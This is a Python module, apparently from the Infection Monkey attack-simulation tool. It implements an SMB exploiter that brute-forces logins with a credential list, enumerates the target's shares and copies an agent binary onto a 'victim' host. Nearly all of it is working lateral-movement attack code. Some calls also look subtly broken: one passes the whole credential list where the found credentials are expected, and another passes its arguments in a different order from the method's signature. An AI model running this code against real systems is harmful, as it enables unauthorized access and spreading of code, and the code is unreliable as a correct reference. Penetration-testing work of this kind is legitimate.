import logging
import ntpath
from io import BytesIO
from pathlib import PurePath
from typing import Any, Dict, Iterable, Optional, Tuple

# SMB
from impacket.smbconnection import SMBConnection

from common.credentials import Credentials
from common.event_queue import IAgentEventPublisher
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.exploit.tools import generate_brute_force_credentials
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import TargetHost

from .smb import SMB
from .smb_options import SMBOptions

logger = logging.getLogger(__name__)


class SMBExploitClient:
    """Manages the SMB connection, Exploitation events"""

    def __init__(
        self,
        agent_binary_repository: IAgentBinaryRepository,
        agent_event_publisher: IAgentEventPublisher,
    ):
        self._agent_binary_repository = agent_binary_repository
        self._agent_event_publisher = agent_event_publisher
        self._smb: Optional[SMBConnection] = None

    def exploit(
        self, host: TargetHost, credentials_list: Iterable[Credentials], options: SMBOptions
    ) -> Optional[Tuple[str, Credentials]]:
        """Exploits a host using SMB. Returns the remote path of the agent binary."""
        credentials = self.brute_force(host, credentials_list, options)
        destination_path = get_agent_dst_path(host)
        agent_binary = self._agent_binary_repository.get_agent_binary(host.operating_system)

        remote_path = self.copy_agent(agent_binary, host, destination_path, credentials_list)
        if not remote_path:
            logger.debug(f"Failed to copy agent to {host}")
            return None

        return remote_path, credentials

    def brute_force(
        self, host: TargetHost, credentials: Iterable[Credentials], options: SMBOptions
    ) -> Optional[Credentials]:
        """Brute force SMB login"""
        credentials_list = generate_brute_force_credentials(credentials)
        for _credentials in credentials_list:
            # TODO: Test if we only need to create the connection once
            self._smb = SMB.create_connection(host)
            if not self._smb:
                continue

            self._smb = SMB.login(self._smb, _credentials)
            if not self._smb:
                continue

            self._smb.setTimeout(options.smb_connect_timeout)

            if SMB.logout_guest(self._smb):
                continue

            # At this point, we've successfully logged in with a non-guest user
            # Can we break out of the loop here?
            return _credentials

        return None

    def copy_agent(
        self,
        agent_binary: BytesIO,
        host,
        path: PurePath,
        credentials,
    ) -> Optional[str]:
        """File path if the agent was copied successfully, otherwise None"""
        if not SMB.query_server_info(self._smb):
            return None

        shares = self.query_shares(host, path)
        for remote_path, share_name, share_path in self.connected_shares(host, shares, credentials):
            destination = self.copy_agent_binary(
                agent_binary, host, remote_path, share_name, share_path
            )
            if destination:
                return destination

        return None

    def query_shares(self, host: TargetHost, path: PurePath):
        resp = SMB.query_shared_resources(self._smb)
        if not resp:
            return ()

        high_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        low_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        file_name = path.name

        for i in range(len(resp)):
            share_name = resp[i]["shi2_netname"].strip("\0 ")
            share_path = resp[i]["shi2_path"].strip("\0 ")
            current_uses = resp[i]["shi2_current_uses"]
            max_uses = resp[i]["shi2_max_uses"]

            if current_uses >= max_uses:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because max uses is exceeded",
                    host,
                )
                continue
            elif not share_path:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because share path is invalid",
                    host,
                )
                continue

            share_info = {"share_name": share_name, "share_path": share_path}

            if str(path).lower().startswith(share_path.lower()):
                high_priority_shares += ((ntpath.sep + str(path)[len(share_path) :], share_info),)

            low_priority_shares += ((ntpath.sep + file_name, share_info),)

        return high_priority_shares + low_priority_shares

    def connected_shares(self, shares, host: TargetHost, credentials: Credentials):
        """Yields a tuple of (remote_path, share_name, share_path)
        Side effect: the SMBConnection is connected to the share"""
        # Attempt to connect to a share over SMB
        for remote_path, share in shares:
            share_name = share["share_name"]
            share_path = share["share_path"]

            # TODO: Do we really need to handle reconnects?
            if not self._smb:
                self.connect_with_user(host, credentials)
                if not self._smb:
                    break

            try:
                self._smb.connectTree(share_name)
            except Exception as exc:
                logger.error(
                    f'Error connecting tree to share "{share_name}" on victim {host}: {exc}'
                )
                continue

            yield remote_path, share_name, share_path

    def connect_with_user(self, host: TargetHost, credentials: Credentials) -> bool:
        self._smb = SMB.create_connection(host)
        if not self._smb:
            return False

        self._smb = SMB.login(self._smb, credentials)
        if not self._smb:
            return False

        return True

    def copy_agent_binary(
        self,
        agent_binary: BytesIO,
        host: TargetHost,
        remote_path: str,
        share_name: str,
        share_path: str,
    ) -> Optional[str]:
        logger.debug(
            f"Trying to copy monkey file to share '{share_name}' [%s + %s] on victim {host}",
            share_path,
            remote_path,
        )

        if not self._smb:
            return None

        try:
            # TODO: Use config timeout value
            # self._smb.setTimeout(timeout)
            self._smb.putFile(share_name, remote_path, agent_binary.read)

            logger.info(
                f"Copied monkey agent to remote share '{share_name}' "
                f"[{share_path}] on victim {host}"
            )

            return ntpath.join(share_path, remote_path.strip(ntpath.sep))
        except Exception as exc:
            logger.error(f"Error uploading monkey to share '{share_name}' on victim {host}: {exc}")
            return None
